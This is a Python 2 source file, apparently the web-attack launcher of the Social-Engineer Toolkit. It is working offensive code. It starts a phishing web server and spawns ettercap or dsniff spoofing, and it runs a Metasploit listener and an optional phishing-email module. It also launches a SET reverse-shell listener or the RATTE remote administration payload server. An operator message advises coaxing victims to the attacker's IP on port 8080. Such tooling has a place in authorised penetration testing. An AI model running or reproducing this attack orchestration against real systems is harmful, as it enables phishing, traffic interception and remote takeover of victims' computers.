#!/usr/bin/env python
# Needed to include pexpect for web_attack
import pexpect
import os
import sys
import re
import socket
import subprocess
from src.core.setcore import *

# set current path
definepath=os.getcwd()

# define if use apache or not
apache=0
# see if web server is used
web_server = 0
# open set_config here
apache_check=file("%s/config/set_config" % (definepath),"r")
# loop this guy to search for the APACHE_SERVER config variable
for line in apache_check:
        # strip \r\n
        line=line.rstrip()
        # if apache is turned on get things ready
        match=re.search("APACHE_SERVER=ON",line)
        # if its on lets get apache ready
        if match:
                for line2 in apache_check:
                        line2=line2.rstrip()
                        # set the apache path here
                        match2=re.search("APACHE_DIRECTORY=", line2)
                        if match2:
                                line2=line2.rstrip()
                                apache_path=line2.replace("APACHE_DIRECTORY=","")
                                apache=1
        # web server port for listener
        match1 = re.search("WEB_PORT=", line)
        if match1:
                web_port = line.replace("WEB_PORT=", "")
                web_server = 1

# if we never hit it in set_config for some reason
if web_server == 0: web_port = 80


# setup multi attack options here 
multiattack="off"
if os.path.isfile("src/program_junk/multi_tabnabbing"):
        multiattack="on"
if os.path.isfile("src/program_junk/multi_harvester"):
        multiattack="on"

# Test to see if something is running on port 80, if so throw error
try:
        web_port=int(web_port)
        ipaddr=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        ipaddr.connect(('localhost', web_port))
        ipaddr.settimeout(2)
        if ipaddr:
                # if apache isnt running and something is on 80, throw error
                if apache== 0:
                        PrintError("ERROR:Something is running on port %s. Seeing if it's a stale SET process..." % (web_port))
                        proc=subprocess.Popen("netstat -antp |grep LISTEN |grep '%s'" % (web_port), shell=True, stdout=subprocess.PIPE)
                        stdout_value=proc.communicate()[0]
                        a=re.search("\d+/python", stdout_value)
                        if a:
                                b=a.group()
                                b=b.replace("/python","")
                                PrintStatus("Stale process identified, attempting to kill process %s...." % str(b))
                                subprocess.Popen("kill -9 %s" % (b), shell=True).wait()
                                ipaddr.connect(('localhost', web_port))
                                if ipaddr: 
                                        PrintError("Sorry hoss, couldn't kill it, check whats running on 80 and restart SET!")
                                        ExitSet()
                                if not ipaddr:
                                        PrintStatus("Success, the stale process has been terminated and SET is running normally...")
                        else:
                                PrintWarning("If you want to use Apache, edit the config/set_config")
                                PrintError("Exit whatever is listening and restart SET")
                                ExitSet()
                # if apache is set to run let the user know we are good to go
                if apache == 1:
                        proc=subprocess.Popen("netstat -antp |grep LISTEN |grep '%s'" % (web_port), shell=True, stdout=subprocess.PIPE)
                        stdout_value=proc.communicate()[0]
                        a=re.search("\d+/apache2", stdout_value)
                        if a:
                                PrintStatus("Apache appears to be running, moving files into Apache's home")
                        else:
                                PrintError("Exit whatever is listening and restart SET")
                                ExitSet()
except Exception, e:
        log(e)
        if apache == 1:
                PrintError("Error:Apache does not appear to be running.")
                PrintError("Start it or turn APACHE off in config/set_config") 
                # see if they want an option to turn it on
                pause = raw_input(setprompt(["2"], "Start Apache? [yes|no]"))
                if pause == "yes" or pause == "y":
                        apache_counter = 0
                        if os.path.isfile("/etc/init.d/apache2"):
                                subprocess.Popen("/etc/init.d/apache2 start", shell=True).wait()
                                apache_counter = 1
                        if os.path.isfile("/etc/init.d/httpd"):
                                subprocess.Popen("/etc/init.d/httpd start", shell=True).wait()
                                apache_counter = 1
                        if apache_counter == 0:
                                PrintError("ERROR: Unable to start Apache through SET,")
                                PrintError("ERROR: Please turn Apache off in the set_config or turn it on manually!")
                                PrintError("Exiting the Social-Engineer Toolkit...")
                                ExitSet()


                else: 
                        PrintError("Exiting the Social-Engineer Toolkit...")
                        ExitSet()


except KeyboardInterrupt:
        PrintWarning("KeyboardInterrupt detected, bombing out to the prior menu.")

# gran metasploit root directory
meta_path=meta_path()

# Launch SET web attack and MSF Listener
try:
        if multiattack == "off":
                print (bcolors.BLUE + "\n***************************************************")
                print (bcolors.YELLOW + "Web Server Launched. Welcome to the SET Web Attack.")
                print (bcolors.BLUE + "***************************************************")
                print (bcolors.PURPLE+ "\n[--] Tested on IE6, IE7, IE8, IE9, Safari, Opera, Chrome, and FireFox [--]" + bcolors.ENDC)
                if apache == 1:
                        print (bcolors.GREEN+ "[--] Apache web server is currently in use for performance. [--]" + bcolors.ENDC) 

        if os.path.isfile("src/program_junk/meta_config"):
                fileopen=file("src/program_junk/meta_config", "r")
                for line in fileopen:
                        line=line.rstrip()
                        match=re.search("set SRVPORT 80", line)
                        if match:
                                match2=re.search("set SRVPORT 8080", line)
                                if not match2:
                                        if apache == 1:
                                                PrintWarning("Apache appears to be configured in the SET (set_config)")
                                                PrintWarning("You will need to disable Apache and re-run SET since Metasploit requires port 80 for WebDav")
                                                ExitSet()
                                        print bcolors.RED + """
 Since the exploit picked requires port 80 for WebDav, the
 SET HTTP Server port has been changed to 8080. You will need
 to coax someone to your IP Address on 8080, for example
 you need it to be http://172.16.32.50:8080 instead of standard
 http (80) traffic.""" 
                                

        child=pexpect.spawn("python src/html/web_server.py")

        # if we are using ettercap
        if os.path.isfile("src/program_junk/ettercap"):
                fileopen5=file("src/program_junk/ettercap", "r")
                for line in fileopen5:
                        ettercap=line.rstrip()
                        # run in background
                        ettercap=ettercap+" &"
                        # spawn ettercap or dsniff
                        subprocess.Popen(ettercap, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)

        # if metasploit config is in directory
        if os.path.isfile("src/program_junk/meta_config"):
                PrintInfo("Launching MSF Listener...")
                PrintInfo("This may take a few to load MSF...") 
                child1=pexpect.spawn("ruby %s/msfconsole -L -n -r src/program_junk/meta_config" % (meta_path))
                # if emailer webattack, spawn email questions
                fileopen=file("config/set_config", "r").readlines()
                for line in fileopen:
                        line=line.rstrip()
                        match=re.search("WEBATTACK_EMAIL=ON", line)
                        if match:
                                sys.path.append("src/phishing/smtp/client/")
                                import smtp_web        
                child1.interact()

        if os.path.isfile("src/program_junk/set.payload"):
                fileopen=file("src/program_junk/port.options", "r")
                for line in fileopen: port = line.rstrip()

                # grab configuration 
                fileopen=file("src/program_junk/set.payload", "r")
                for line in fileopen: set_payload = line.rstrip()

                if set_payload == "SETSHELL":
                        print "\n"
                        PrintInfo("Launching the SET Interactive Shell...") 
                        subprocess.Popen("python src/payloads/set_payloads/listener.py %s" % (port), shell=True).wait()

                if set_payload == "RATTE":
                        PrintInfo("Launching the Remote Administration Tool Tommy Edition (RATTE) Payload...")
                        child1=pexpect.spawn("src/payloads/ratte/ratteserver %s" % (port))
                        child1.interact()

        if not os.path.isfile("src/program_junk/meta_config"):
                if not os.path.isfile("src/program_junk/set.payload"):
                        child.interact()

# handle errors
except Exception, e:
        log(e)
        pass
        try:
                if apache == 1:
                        raw_input(bcolors.ENDC +"\nPress [return] when finished.")
                child.close()
                child1.close()
                # close ettercap thread, need to launch from here eventually instead of executing
                # an underlying system command. 
                subprocess.Popen("pkill ettercap 1> /dev/null 2> /dev/null", shell=True).wait()
                # kill dnsspoof if there
                subprocess.Popen("pkill dnsspoof 1> /dev/null 2> /dev/null", shell=True).wait()
                if apache == 1:
                        subprocess.Popen("rm %s/index.html 1> /dev/null 2> /dev/null;rm %s/Signed* 1> /dev/null 2> /dev/null;rm %s/*.exe 1> /dev/null 2> /dev/null" % (apache_path,apache_path,apache_path), shell=True).wait()
        except: 
                try:
                        child.close()
                except:
                        pass

except KeyboardInterrupt:
        sys.exit(1)

try:
        child1.close()
        child.close()
except: 
        pass
